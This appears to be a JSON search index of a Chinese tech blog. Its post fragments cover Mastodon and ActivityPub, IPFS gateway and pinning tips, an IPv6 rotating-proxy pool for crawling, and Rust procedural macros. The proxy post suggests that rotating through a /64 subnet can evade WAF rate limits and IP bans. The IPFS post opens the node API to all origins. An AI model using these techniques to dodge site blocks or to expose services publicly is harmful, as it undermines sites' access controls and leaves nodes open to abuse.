[{"categories":["popular"],"content":"最近 Mastodon 爆火，让我们来谈谈 Mastodon、Fediverse 和 ActivityPub 等相关内容","date":"2023-01-26","objectID":"https://zu1k.com/posts/tutorials/p2p/fediverse/","series":null,"tags":["P2P"],"title":"谈谈 Mastodon、Fediverse 和 ActivityPub","uri":"https://zu1k.com/posts/tutorials/p2p/fediverse/"},{"categories":["popular"],"content":"埃隆·马斯克 440 亿美元拿下 Twitter 后就开始大刀阔斧进行改革，他要做推特 2.0，但没想到他的举措竟然是大量裁员，施行专政。接下来的一系列举措使 Twitter 俨然已经成为某些人自我营销和推广的个人发布平台，想必是之前通过 Twitter 割虚拟货币韭菜割爽了。我想未来老马利用 Twitter 宣传进入政界也不足为奇。于是很多人便开始考虑脱离专制的 Twitter 平台，寻找一个更加开放自由、权力更加分散的平台，Mastodon 凭借多年的技术积累、好看的 UI 和类 Twitter 的交互逻辑，一举跃入众人的视野。 ","date":"2023-01-26","objectID":"https://zu1k.com/posts/tutorials/p2p/fediverse/:0:0","series":null,"tags":["P2P"],"title":"谈谈 Mastodon、Fediverse 和 ActivityPub","uri":"https://zu1k.com/posts/tutorials/p2p/fediverse/#"},{"categories":["popular"],"content":"Mastodon Mastodon 又叫长毛象，我是 21 年左右在某个论坛看到 “草莓县”(cmx.im) 从而接触并了解了 Mastodon。Mastodon 从 16 年就开始开发，在我第一次接触它的时候 UI 就已经很美观了，其在 22 年进入大众视野并受到大家喜爱我一点也不感到奇怪，这么长时间的积累使 Mastodon 的成功成为历史的必然。 Mastodon 开源、去中心化(联邦制)的特性决定了任何个人和组织都可以搭建自己的 Mastodon 实例，从而加入到这个社交网络中来，人们既可以按照爱好、观念聚集在某个实例中，同时又可以与其他实例的用户进行各种交互，这种小邦大连的社交模式真的深得人心。 简单来说，作为用户，你可以从众多实例中根据喜好选择其中一个，注册账号，然后你就可以像推特一样发嘟(类比推特的发推)，关注其他用户，查看时间线。与推特不同的一点是，如果你关注的用户注册在其他实例，那你就需要通过用户名加域名的方式来定位他。这有一点需要注意，在不同的实例中可能有多个用户有相同的用户名，所以实例的域名也是非常重要的一部分。因此，如果你想要打造个人品牌，就需要考虑防止有人通过一比一复制你的用户名、头像、介绍等信息来冒充你，也许提供 GPG 公钥是个不错的选择，貌似目前 Mastodon 没有集成成熟的解决方案来避免冒充问题。 据我所知国内部分高校组建了一个自己的小联邦，这个小联邦中每个学校都是一个独立的 Mastodon 实例，每个学校的实例都由本校学生独立自治，同时加入这个高校联邦的所有实例之间又可以互相交互。这个小联邦叫 闭社，感兴趣的同学可以关注一下，搭建自己学校的实例并加入其中。 ","date":"2023-01-26","objectID":"https://zu1k.com/posts/tutorials/p2p/fediverse/:1:0","series":null,"tags":["P2P"],"title":"谈谈 Mastodon、Fediverse 和 ActivityPub","uri":"https://zu1k.com/posts/tutorials/p2p/fediverse/#mastodon"},{"categories":["popular"],"content":"Fediverse 其实 Mastodon 并不是唯一的 Fediverse，Fediverse 这个词也不是 Mastodon 首创，早在 2008 年就有人提出来了这个概念，并构想社交和内容发布平台要满足独立托管、通过标准化协议通讯等概念。仔细想想，这些概念是不是跟 Email 很像？Email 可是在互联网发明之初就流行的协议，看起来互联网的发展过程也是轮回的，分久必合(商业公司中心化体验好)、合久必分(去中心化自由、自治)。这里我推荐阅读这篇文章: Mastodon, the rise of the Fediverse。 目前最流行的 Fediverse 当属社交领域的 Mastodon 和即时通讯领域的 Matrix。据我了解，Matrix 的技术生态更加繁荣，有众多服务端和客户端的实现，同时也可以对接 Slack、Discord、Telegram、QQ、WeChat 等众多通讯 APP，但是目前看起来非技术爱好者用的并不多，大部分用户都是开发者和技术爱好者。而 Mastodon 的客户端虽有很多，但服务端只有官方一个实现，称不上技术生态繁荣，但是用户却遍地开花，特别是普通非技术用户。这种现象需要引起思考，技术虽可以改变世界，但技术并不是唯一，更好的UI、更好的交互、更好的体验，这些才是带来产品发展的外部动力的基础。 目前我的主要社交媒体还是 Twitter，正在慢慢向 Mastodon 转，主要是有很多要关注的人他们并没有在 Mastodon 宇宙安家。即时通讯方面除开熟人通讯必要的 QQ 和微信，陌生人通讯我正在逐渐放弃 Telegram，因为 Telegram 也正在变得封闭、专制、商业化，我在很多 Matrix 实例上都有匿名账户，但是我的朋友并不愿意来到 Matrix 网络，因此目前我的陌生人通讯主力是邮箱，我会对外公开我的邮箱地址，任何人都可以给我发邮件交流。 除了上面提到的两个 Fediverse，还有一些其他的 Fediverse 平台并不为大众所知，覆盖了通讯、社交、图片、音乐、视频等众多领域，大家可以通过以下网站探索: https://fediverse.party/en/fediverse/ https://fediverse.info/ https://fedi.tips/ https://joinfediverse.wiki/Main_Page 对了，我还要着重提一个，Rust 语言开发的论坛 Fediverse，Lemmy，可以用来替代 Reddit、HackerNews，轻量好用。 ","date":"2023-01-26","objectID":"https://zu1k.com/posts/tutorials/p2p/fediverse/:2:0","series":null,"tags":["P2P"],"title":"谈谈 Mastodon、Fediverse 和 ActivityPub","uri":"https://zu1k.com/posts/tutorials/p2p/fediverse/#fediverse"},{"categories":["popular"],"content":"ActivityPub 协议 刚刚提到了 Fediverse 需要标准化协议来进行通讯，而 Mastodon 基于的协议便是 ActivityPub 协议，这个协议历史比 Mastodon 早，并且已经被 W3C 在 2018 年推荐作为标准。 这个协议规范了去中心化社交网络交互细节的各方面，包括用户的交互(收发信息、关注、喜欢)，还有活动(就是内容、推文、嘟文)的发布、更新、删除、喜欢、屏蔽等等。 如果各个平台都遵循相同的协议，那使用不同平台的用户就可以在同一 Fediverse 中交互，举个例子，我可以在 Mastodon 和 Pixelfed 这两个不同的平台之间进行一些简单的交互。 我测试用 Pixelfed 平台的账号(@zu1k@pixey.org) 关注我的 Mastodon 账号(@zu1k@fosstodon.org)，可以成功搜索到用户，显示头像、简介、关注量等信息，可以成功关注。在 Mastodon 平台也可以即时收到被关注的通知，同时可以通过 Mastodon 查看 Pixelfed 的账号信息。 但是我在 Pixelfed 发布的内容，从 Mastodon 却无法看到，这说明两个应用虽然都使用 ActivityPub 协议，但是其在内容封装方面有自己专属的子协议，这些子协议之间并不互相兼容，只有那些公共的兼容的协议才能跨应用使用，例如账户信息、关注这类。 同时我还尝试使用 Mastodon 查看 Lemmy 的用户，可以看到用户信息，发布的部分内容可以看到，有一些出入，说明这两者之间也是有不兼容的地方。 通过 Lemmy 的 issue 和 PR 列表我看到 Lemmy 正在做与 Mastodon 的兼容工作，这很伟大，支持！ 同时，一位 GitHub 的员工开发了一个有意思的东西，ActivityPub to Mastodon bridge。pub 的目的不是托管 ActivityPub 社区，而是旨在使拥有自己域并因此控制其身份的人能够参与 Fediverse，这意味着你无需搭建 Mastodon 就可以用自己的域名加入到 Mastodon 联邦中了，这就很方便了，轻量好用啊。 ","date":"2023-01-26","objectID":"https://zu1k.com/posts/tutorials/p2p/fediverse/:3:0","series":null,"tags":["P2P"],"title":"谈谈 Mastodon、Fediverse 和 ActivityPub","uri":"https://zu1k.com/posts/tutorials/p2p/fediverse/#activitypub-协议"},{"categories":["popular"],"content":"Mastodon 性能问题 Mastodon 目前官方实现使用 Ruby 语言，Ruby 依靠 Rails 框架用来开发 Web 应用简直是不要太快捷，非常适合频繁变化的需求。但是 Ruby 本身的性能并不乐观，去年 Shopify 使用 Rust 开发 YJIT 顺利合入 Ruby 上游，并随 Ruby 3.2 版本正式发布，这将 Ruby 的性能提升了约 40%，但是 Ruby 的性能仍无法与目前流行的 JavaScript 比肩(主要是 V8 引擎的功劳)，更不要提 Golang 和 Rust了。而我经过搜索发现，竟无 Golang 和 Rust 的服务端实现，即使有也已经停止了开发，这使 Mastodon 如何支撑即将到来的上亿用户量？如何与 Twitter 竞争？当然，目前已有的实例都没有这么多的用户量，等未来有这个性能需求的时候，自然会有商业公司出钱出力来解决这个问题。 不过我倒是不希望这一天的到来，如果某一个 Mastodon 实例的用户量上千万，这其实就成了另外一个 “Twitter”，大量用户聚集在商业公司运营的单一或几个主流实例上，那联邦制、分布式等概念实际上也就名存实亡了。不要忘记我们逃离 Twitter 来到 Mastodon 的初心啊！ 不过虽然这么说，我还是希望 Mastodon 性能能够更好一点，同时我也看到了一些优化 Mastodon 性能的努力。随着 Mastodon 实例数量的增多，单个 Mastodon 实例往往需要连接众多其他实例来进行交互，这带来了巨大的网络性能压力，使得想要自行搭建 Mastodon 实例的小伙伴不得不花更多钱在服务器费用上。这极大概率会导致部分实例脱离 Fediverse，形成自己封闭的，仅有几个节点的小联邦，这应该并不是我们想要看到的。我已经看到了有人开发了 ActivityPub relay Relay 列表，中继服务器与大量实例连接，聚合内容，然后提供给中小型服务器，从而使中小型服务器无需连接大量实例就可以实现相同规模的信息获取。 国外的社交和通讯正在变天，有上天的，有摆脱大公司的。而国内因为各种法律条款的限制，一般人根本没有权力做社交和通讯，会不会就错过这一波改变呢？让我们拭目以待吧。 ","date":"2023-01-26","objectID":"https://zu1k.com/posts/tutorials/p2p/fediverse/:4:0","series":null,"tags":["P2P"],"title":"谈谈 Mastodon、Fediverse 和 ActivityPub","uri":"https://zu1k.com/posts/tutorials/p2p/fediverse/#mastodon-性能问题"},{"categories":["tutorial"],"content":"IPFS 是新兴的技术，本文借 Planet 发布之机，为大家提供一些 IPFS 的日用优化指南，包括搭建本地网关、Pin优化、优化资源占用等。在文末，我附加了自己对 IPFS 的一些看法。","date":"2022-06-06","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs-easy-use/","series":null,"tags":["IPFS","P2P"],"title":"IPFS 日用优化指南","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs-easy-use/"},{"categories":["tutorial"],"content":"这两天，V2EX 的站长 Livid 发布了 一款基于 IPFS 和 ENS 的内容发布和订阅应用 [Planet]，其想法在之前的一期 [播客访谈] 中就提到过，当初就觉得很有意思。也不出我所料，Planet 一经发布就引来了众多关注，Planet 用图形化的方式使更多普通人可以尝试 IPFS 这类分布式内容发布，据说后面还会增加评论功能，这在 IPFS 网络中也算是一个不小的挑战，不知道 Planet 能将易用性做到什么水平，我会继续关注。 我也在很早之前就了解并开始使用 IPFS 技术，在折腾的过程中也积累了一些经验，下面我将向你们分享一些使用技巧，使你的 IPFS 更加易用。 完全新手朋友请先阅读我在 20年写的 《IPFS 新手指北》 这篇文章 ","date":"2022-06-06","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs-easy-use/:0:0","series":null,"tags":["IPFS","P2P"],"title":"IPFS 日用优化指南","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs-easy-use/#"},{"categories":["tutorial"],"content":"搭建网关 相比较使用公共 IPFS 网关，我更推荐自己在家中搭建，不仅能提供更优的体验，还可以避免在每台电脑安装 IPFS 的麻烦。 按照普通教程在服务器上安装好 IPFS 后，你需要修改配置文件，对外开放 Api 和 Gateway。 因为是在家庭网络中，我就不额外介绍访问控制配置，如果你是在公网服务器搭建，需要注意配置访问控制以免被滥用 修改 API 和 Gateway 绑定的 IP 为 0.0.0.0 以开放给局域网，然后修改 API 的 http header 配置跨域： \"API\": { \"HTTPHeaders\": { \"Access-Control-Allow-Headers\": [ \"X-Requested-With\", \"Range\", \"User-Agent\" ], \"Access-Control-Allow-Methods\": [ \"GET\", \"POST\", \"OPTIONS\" ], \"Access-Control-Allow-Origin\": [ \"*\" ] } } 配置子域名网关，可以达到 dweb.link 的效果。例如要使用 *.ipfs.zu1k.com 作为子域名网关，就要先将泛域名解析到 IPFS 网关的 IP，然后在 Gateway 配置中增加以下内容： \"Gateway\": { \"PublicGateways\": { \"ipfs.zu1k.com\": { \"NoDNSLink\": false, \"Paths\": [ \"/ipfs\", \"/ipns\", \"/api\" ], \"UseSubdomains\": true } }, } 为获得更好的 IPFS 使用体验，推荐安装 [IPFS 浏览器插件]，或者使用 Brave 浏览器，可以让 IPFS 的使用体验更加原生。 ","date":"2022-06-06","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs-easy-use/:1:0","series":null,"tags":["IPFS","P2P"],"title":"IPFS 日用优化指南","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs-easy-use/#搭建网关"},{"categories":["tutorial"],"content":"Pin 优化 在发布内容后，马上通过公开的 IPFS 网关访问，通常会很慢很慢，甚至到超时都无法访问，这是由 IPFS 的寻址过程导致的。随着访问内容的用户越来越多，他们的 IPFS 节点上会缓存你内容的数据，这个时候新节点再访问同一份内容，通常就会很快。这就是 IPFS 的特性，就跟 BT 下载的原理类似，数据在网络中存在的副本越多，就越能利用 P2P 网络的性能。 但是一个 IPFS 节点也不会无限期的缓存你的数据，默认配置下 GC 频率是 1 个小时一次，也就是说你的数据如果用户不访问，在一个小时后就会从他们的节点中被清理掉。为了能够让我们的数据长久的留在 IPFS 网络中，就需要用户 Pin 住你的数据，以防被 GC 掉。我的做法是利用闲置的服务器搭建 IPFS 节点用来 Pin 自己的数据，然后朋友之间互相 Pin 住，算是合作共赢。 所以大家不妨 Pin 一下我的博客：ipfs pin add /ipns/zu1k.com 如果你使用 IPNS 或者域名的方式对外公开经常修改的内容，就需要设置定时任务来不断 Pin 住新的数据，因为 IPFS 在 Pin 一个 IPNS 的时候，只会 Pin 当前状态对应的 CID ，后面不会自己去更新。 ","date":"2022-06-06","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs-easy-use/:2:0","series":null,"tags":["IPFS","P2P"],"title":"IPFS 日用优化指南","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs-easy-use/#pin-优化"},{"categories":["tutorial"],"content":"Remote Pinning Service 如果你不想一直运行本机的 IPFS 节点，但又想让别人可以访问到你发布的内容，可以考虑使用 Remote Pinning service，这是由一些中心化的服务商提供的内容 Pinning 服务，其效果与你本机 pin 相当。甚至因为他们的网络质量更好、连接的节点更多，将内容 Pin 在他们的节点上，可以更快的被分发和访问。 我主要推荐两家，[Pinata] 和 [web3.storage]，具体教程可以看 官方文档 # ipfs pin remote service ls Pinata https://api.pinata.cloud/psa web3_storage https://api.web3.storage Pinata 是无门槛的，免费提供 1G 的 Pin 容量。 web3.storage 免费提供 1T，但是 Pin Api 需要发邮件申请，一天以内就会有回复。[教程] ","date":"2022-06-06","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs-easy-use/:2:1","series":null,"tags":["IPFS","P2P"],"title":"IPFS 日用优化指南","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs-easy-use/#remote-pinning-service"},{"categories":["tutorial"],"content":"开放端口 因为 IPFS 需要 P2P 通讯，所以如果你没有公网的 IPFS 节点 Pin 你的内容，就需要保证自己本机的 IPFS 节点可被访问。检查你的路由器，开启 UPnP 功能，必要时建立端口映射，开放你的 4001 端口（如果没有修改过的话）。 ","date":"2022-06-06","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs-easy-use/:2:2","series":null,"tags":["IPFS","P2P"],"title":"IPFS 日用优化指南","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs-easy-use/#开放端口"},{"categories":["tutorial"],"content":"资源占用优化 如果你没有做任何的配置优化，只是按照常规流程下载安装运行，你会发现 IPFS 在后台会占用大量的 CPU 资源和内存，你的风扇开始狂转；维持了大量的网络连接，导致你的网络卡顿。这是因为 IPFS 的默认配置并没有针对个人小主机进行优化，如果你在一台 2 核的 Linux 服务器上运行，IPFS 甚至能吃满你所有的 CPU，网络的拥挤程度有可能使你连 ssh 登录都成了一个问题。 这个时候我们就需要调整配置文件中的参数来想办法降低资源占用，以使 IPFS 不影响我们的日常工作。其实 IPFS 已经提供了好几个配置文件，通过 ipfs config profile --help 可查看具体介绍。 profile 不知道怎么翻译合适，翻译成文件不太准确，ipfs 中应用这些 profile 只是修改某些特定选项，并不是配置文件的完全改变 我推荐在低配置的服务器和个人电脑上应用 lowpower 配置，ipfs config profile apply lowpower，这会限制 IPFS 维持的连接数量，降低网络占用，还会降低 GC 频率，这可以明显的降低 cpu 占用，我的测试可以使 cpu 占用从 80% 以上降低到 20% 以下。当然，资源占用的降低也会导致通讯效率的降低，会使内容寻址时间增长，影响使用的体验。如果你的使用方式是类似于 RSS 订阅和离线查看的模式，增长的寻址时间可以忽略不记。 如果你是在拥有公网 IP 的服务器上运行 IPFS，还推荐应用 server 配置，ipfs config profile apply server，这会关闭本地网络的节点发现，因为这是无意义的，这样也可以降低网络占用。 ","date":"2022-06-06","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs-easy-use/:3:0","series":null,"tags":["IPFS","P2P"],"title":"IPFS 日用优化指南","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs-easy-use/#资源占用优化"},{"categories":["tutorial"],"content":"后言 20 年 11 月底，我发布了 《IPFS 新手指北》 这篇文章，期待 IPFS 能够迅猛发展，成为下一代 Web 基础设施。不知不觉已经过去一年半了，就目前情况来看 IPFS 虽然仍在不断发展，但还是在半死不活的状态，这一点让我非常失望。 但仔细一想，期待某门技术成为下一个主流本身就是不合理的。任何技术都应该是在广泛的需求之下才有可能成长为广泛应用的主流，而不是说你有某些好的特性就一定能够被广泛接受。从需求上讲，我们确实需要基于 P2P 的内容发布，也需要基于内容的寻址方式，这些都具有非常好的优点，但并不能满足我们对互联网的全部需求。我们在期望内容不可变、内容不被删除的同时，也会希望能够拥有删除或者修改某个内容的权利；我们喜欢 P2P 的去中心化内容分发方式，但不能否认任何人都希望延迟更低、速度更快；我们还会希望对内容具有更多控制权，包括细致的访问控制、更灵活的表达形式…… 基于以上想法，我不认为 IPFS 就是下一代 Web，也就是都在说的 Web3。但我不否认 IPFS 有巨大的潜力，在下一代 Web 中充当非常重要的角色，只是这个角色并不是全部。而基于 P2P 的内容分发方式早就不是什么新技术，BitTorrent 和 基于 BT 技术的 BtSync、BTFS 也都非常具有竞争力，IPFS 想要与其竞争需要更加努力，使其更加的易用和平民化。 我自己也已经使用 IPFS 接近两年，这两年的时间我自己的感觉是 IPFS 本身没有太大的突破性发展，而围绕其进行的各种营销和唬人活动层出不穷，文件挖矿、NFT 等等，不过这些也的确让更多人关注起 IPFS，并为 IPFS 网络贡献了大量节点和存储空间，但我总觉得怪怪的，这不是发展的长远之道啊。 不过看近几年互联网越发封闭，内容审查越发严格，想必 IPFS 这类分布式内容发布方式会被更多非技术人关注，期待在这个需求激增的关头，有更多优秀的应用浮现，将 IPFS 推展开来，让更多普通人能够更加方便的使用这些新技术，享受新技术带来的权利，那些我们本该拥有但被剥夺的权利。 ","date":"2022-06-06","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs-easy-use/:4:0","series":null,"tags":["IPFS","P2P"],"title":"IPFS 日用优化指南","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs-easy-use/#后言"},{"categories":["tutorial"],"content":"哪个小伙子不想要一个拥有 1844 6744 0737 0955 1616 个 IP 的代理池？本文中我将介绍一种充分利用 IPv6 资源来构建代理池的方法","date":"2022-05-07","objectID":"https://zu1k.com/posts/tutorials/http-proxy-ipv6-pool/","series":null,"tags":["proxy","IPV6"],"title":"谁不想要 2^64 个 IP 的代理池 ？","uri":"https://zu1k.com/posts/tutorials/http-proxy-ipv6-pool/"},{"categories":["tutorial"],"content":"前言 昨天我舍友为了爬虫购买了昂贵的 IP 代理池，我在旁边突然萌生了一个想法，现在各大 ISP/IDC 动不动就给你分配一整个 64 位前缀的 IPv6 网段，我们能不能好好利用一下这庞大的 IPv6 IP 资源呢？ 有了这个想法我就睡不着了，今天一大早（9点半）我就起来着手研究，最终成功实现每一个请求从一个单独的 IPv6 地址发出。 先看效果，我把写好的程序放在服务器上跑了一会，下面是 Cloudflare 统计的访问信息，可以看到独立访问者 (独立 IP) 数量达到了我的小博客前所未有的数量，基本上是一个请求一个独立 IP，效果非常不错。 ","date":"2022-05-07","objectID":"https://zu1k.com/posts/tutorials/http-proxy-ipv6-pool/:1:0","series":null,"tags":["proxy","IPV6"],"title":"谁不想要 2^64 个 IP 的代理池 ？","uri":"https://zu1k.com/posts/tutorials/http-proxy-ipv6-pool/#前言"},{"categories":["tutorial"],"content":"教程 首先你要有一整个 IPv6 子网路由给你，当遇到吝啬的服务商，即使他们有巨多的 IPv6 资源，他也不给你用，这种情况你没辙。不过幸好，绝大多数 ISP/IDC 都会给你一整个 IPv6 /64 子网，有的甚至可以申请 /56 子网，这数量又增加了好几个数量级，所以你几乎不必担心。 为了方便实验，我购买了 [Vultr 的服务器]，如果你还没有注册，可以使用我的 [AFF 链接]. 你可以通过 ip a 命令查看网络接口的地址，从而获取你的 IPv6 子网信息： $ ip a ...... 2: enp1s0: \u003cBROADCAST,MULTICAST,ALLMULTI,UP,LOWER_UP\u003e mtu 1500 qdisc fq state UP group default qlen 1000 ...... inet6 2001:19f0:6001:48e4:5400:3ff:fefa:a71d/64 scope global dynamic mngtmpaddr valid_lft 2591171sec preferred_lft 603971sec inet6 fe80::b155:e257:a8f7:6940/64 scope link stable-privacy valid_lft forever preferred_lft forever 可以看到，默认给你的 IPv6 地址是动态的，这是由 SLAAC 协议根据前缀和 Mac 地址自动生成的; 还有一个 fe80 开头的 IPv6 地址，这也是自动分配的本地链路地址。这很好，通过这些无状态地址配置协议，使 IPv6 避免的手动配置，即插即用。 在我的试验中，我拿到的子网为 2001:19f0:6001:48e4::/64，下面都以此为基础。 绑定和路由 在拿到 IPv6 子网后，需要添加路由。 # ip addr add local 2001:19f0:6001:48e4::/64 dev lo # 纠正：无需添加地址，这一行只能添加一个地址。我们通过 ip_nonlocal_bind 来允许绑定 ip route add local 2001:19f0:6001:48e4::/64 dev enp1s0 为了能够绑定任意 IP，我们需要开启内核的 ip_nonlocal_bind 特性： sysctl net.ipv6.ip_nonlocal_bind=1 NDP 类似于 IPv4 中 ARP 协议的作用，IPv6 中需要使用 ND 协议来发现邻居并确定可用路径。我们需要开启一个 ND 代理： 安装 ndppd: apt install ndppd 编辑 /etc/ndppd.conf 文件: route-ttl 30000 proxy enp1s0 { router no timeout 500 ttl 30000 rule 2001:19f0:6001:48e4::/64 { static } } 启动 ndppd: systemctl start ndppd 注意 只有使用 ND 协议进行主机发现的时候才需要开启 NDP。 如果整个子网是直接路由过来，则无需进行这一步。例如使用 Linode 或 He.com Tunnelbroker 验证 接下来你可以验证一下了，用 curl --interface 指定出口 IP： $ curl --interface 2001:19f0:6001:48e4::1 ipv6.ip.sb 2001:19f0:6001:48e4::1 $ curl --interface 2001:19f0:6001:48e4::2 ipv6.ip.sb 2001:19f0:6001:48e4::2 可以看到，能够按照我们指定的任意 IP 进行请求 ","date":"2022-05-07","objectID":"https://zu1k.com/posts/tutorials/http-proxy-ipv6-pool/:2:0","series":null,"tags":["proxy","IPV6"],"title":"谁不想要 2^64 个 IP 的代理池 ？","uri":"https://zu1k.com/posts/tutorials/http-proxy-ipv6-pool/#教程"},{"categories":["tutorial"],"content":"Http 代理 为了方便使用，使用 Rust 写了一个 http 代理服务端，每一个请求会走指定 IPv6 子网下随机 IP，算是一个基础 demo ./http-proxy-ipv6-pool -b 127.0.0.1:51080 -i 2001:19f0:6001:48e4::/64 $ while true; do curl -x http://127.0.0.1:51080 ipv6.ip.sb; done 2001:19f0:6001:48e4:971e:f12c:e2e7:d92a 2001:19f0:6001:48e4:6d1c:90fe:ee79:1123 2001:19f0:6001:48e4:f7b9:b506:99d7:1be9 2001:19f0:6001:48e4:a06a:393b:e82f:bffc 2001:19f0:6001:48e4:245f:8272:2dfb:72ce 2001:19f0:6001:48e4:df9e:422c:f804:94f7 2001:19f0:6001:48e4:dd48:6ba2:ff76:f1af 2001:19f0:6001:48e4:1306:4a84:570c:f829 2001:19f0:6001:48e4:6f3:4eb:c958:ddfa 2001:19f0:6001:48e4:aa26:3bf9:6598:9e82 2001:19f0:6001:48e4:be6b:6a62:f8f7:a14d 2001:19f0:6001:48e4:b598:409d:b946:17c 欢迎 Star: https://github.com/zu1k/http-proxy-ipv6-pool ","date":"2022-05-07","objectID":"https://zu1k.com/posts/tutorials/http-proxy-ipv6-pool/:3:0","series":null,"tags":["proxy","IPV6"],"title":"谁不想要 2^64 个 IP 的代理池 ？","uri":"https://zu1k.com/posts/tutorials/http-proxy-ipv6-pool/#http-代理"},{"categories":["tutorial"],"content":"碎碎念 ","date":"2022-05-07","objectID":"https://zu1k.com/posts/tutorials/http-proxy-ipv6-pool/:4:0","series":null,"tags":["proxy","IPV6"],"title":"谁不想要 2^64 个 IP 的代理池 ？","uri":"https://zu1k.com/posts/tutorials/http-proxy-ipv6-pool/#碎碎念"},{"categories":["tutorial"],"content":"一开始的想法 其实我一开始的想法并不是直接给接口附加整个 IP 段的。一开始我并不知道网络接口可以直接附加一整个 IP 段，考虑到这个 IPv6 段数量过于庞大，通过枚举给接口附加多个静态 IP 显然不现实，所以我就在想办法去自己封装 IP 包然后进行注入。 我想到了两个注入数据包的方案： 可以完全自己封装 IPv6 包以及下层协议，通过网卡的 raw fd 直接写数据 这个方案在我想到的一瞬间我就放弃了，因为协议过于复杂，我根本不可能实现 创建一个 TUN 设备，配置这个 TUN 设备的网段为 IPv6 子网，然后将 TUN 设备和真实网络设备创建网桥。 通过 TUN 向系统网络栈注入源 IP 为网段下随机的 IPv6 地址，伪造有众多 host 的假象。 因为前面稍微了解过 TUN (可以看我之前写的文章[使用 TUN 的模式])，所以自然而然我就会有这个想法，并且我深信这是可行的。我之所以认为这样可行，是因为之前搞过 [给每一个 Docker 容器一个独立的 IP]，同样是充分利用丰富的 IPv6 资源，感兴趣的同学可以看一下。 通过搜索资料，最后确定使用 TUN 不可行，至少要用 TAP，[因为要处理 NDP 协议]，具体后面的细节我也没有深入研究。 幸亏后面搜资料发现了本文方便的方法，才避免了我陷入这些迷途。反思一下，即自己的知识不够，对 Linux 内核及其提供的众多功能了解不够深入，导致人家原本就有的功能自己根本不知道，所以想不出合适的方案。 ","date":"2022-05-07","objectID":"https://zu1k.com/posts/tutorials/http-proxy-ipv6-pool/:4:1","series":null,"tags":["proxy","IPV6"],"title":"谁不想要 2^64 个 IP 的代理池 ？","uri":"https://zu1k.com/posts/tutorials/http-proxy-ipv6-pool/#一开始的想法"},{"categories":["tutorial"],"content":"WAF 我也不是非常了解，现在的 WAF 是不是就是单纯根据 IP 来进行限流限速 ？如果真是这样，那利用这庞大的 IPv6 资源岂不是轻松绕过封禁。 如果是会直接封禁或者限制整个子网，会不会有很严重的误杀，毕竟不是所有 ISP 都会这么大方的给一整个 IP 段。 有了解的小伙伴欢迎评论交流。 ","date":"2022-05-07","objectID":"https://zu1k.com/posts/tutorials/http-proxy-ipv6-pool/:4:2","series":null,"tags":["proxy","IPV6"],"title":"谁不想要 2^64 个 IP 的代理池 ？","uri":"https://zu1k.com/posts/tutorials/http-proxy-ipv6-pool/#waf"},{"categories":["coding"],"content":"需求 今天遇到一个需求，需要随机的生成一个枚举类型的实例。 不像 Python 那样方便，用 Rust 需要实现特定的 Trait，最简单的想法就是给枚举类型不同的成员编个号，然后生成一个随机数，实例化对应的成员，如果成员拥有数据，就递归的随机生成这些数据。 impl Distribution\u003cInstruction\u003e for Standard { fn sample\u003cR: rand::Rng + ?Sized\u003e(\u0026self, rng: \u0026mut R) -\u003e Instruction { match rng.gen_range(0..459) { 0 =\u003e Instruction::Unreachable, 1 =\u003e Instruction::Nop, 2 =\u003e Instruction::Block(BlockType::FunctionType(rng.gen())), 3 =\u003e Instruction::Catch(rng.gen()), // ... 预估超过2千行 _ =\u003e unreachable!(), } } } 需求本身确实简单，问题在于这个枚举类型的成员太多了，足足有 459 个，按照传统的思路，保守估计至少要写半天，并且很枯燥。图中可以看出，要对该枚举类型实现一个简单的函数都需要上千行。 庞大的枚举类型 我非常讨厌这种简单却繁重的工作的，我想到了 Rust 过程宏。 ","date":"2022-03-31","objectID":"https://zu1k.com/posts/coding/i-love-rust-proc_macro/:1:0","series":null,"tags":["coding","macro"],"title":"我爱 Rust 过程宏","uri":"https://zu1k.com/posts/coding/i-love-rust-proc_macro/#需求"},{"categories":["coding"],"content":"过程宏 当初学 Rust 的时候，了解过 宏 相关的内容，其中 声明宏 技术我已经在其他项目中实践过了，因为其本身就是个模板生成代码，所以无法满足我这次的需求。而过程宏可以通过编写函数，对代码本身进行解析和处理，在抽象语法树的基础上进行操作，所以可以实现非常复杂的逻辑，是代码生成方面的绝佳工具。 过程宏的编写比较费脑子，写一个自动生成代码的过程宏可能会让我掉几根头发。但相比较写几千行枯燥代码浪费生命，我还是更愿意舍弃掉这几根头发。并且我还惊奇的发现，rand 库在 0.5 版本的时候曾经实现过类似的过程宏，可以给任意的结构、元组和枚举实现 Rand，虽然已经不维护了，但是可以给我借鉴。 ","date":"2022-03-31","objectID":"https://zu1k.com/posts/coding/i-love-rust-proc_macro/:2:0","series":null,"tags":["coding","macro"],"title":"我爱 Rust 过程宏","uri":"https://zu1k.com/posts/coding/i-love-rust-proc_macro/#过程宏"},{"categories":["coding"],"content":"定义#[derive]宏 我的需求是根据 Instruction 的成员信息，自动实现 impl Distribution\u003cInstruction\u003e for Standard，这里就需要写一个 #[derive]宏，使其作用在 Instruction 上。 #[derive(Debug, Rand)] pub enum Instruction {...} 首先定义名为 Rand 的 #[derive]过程宏。在这个函数里，我们可以拿到 Instruction 的 token 序列，然后将其解析为抽象语法树 (AST)，最后通过 AST 和我们的逻辑生成新的 token 序列，即最终生成的代码。 #[proc_macro_derive(Rand)] pub fn rand_derive(input: TokenStream) -\u003e TokenStream { let ast = parse_macro_input!(input as DeriveInput); let tokens = impl_rand_derive(\u0026ast); TokenStream::from(tokens) } 对于将 token 序列解析为 AST，社区普遍使用的是 syn 库，而将 AST 的数据结构还原成 token 序列一般使用 quote 库，今天搜的时候我惊奇的发现这两个库都是 David Tolnay 开发的。看了一下 他在crates.io发布的库，真是强者恒强，建议自己去看一下，然后疯狂膜拜 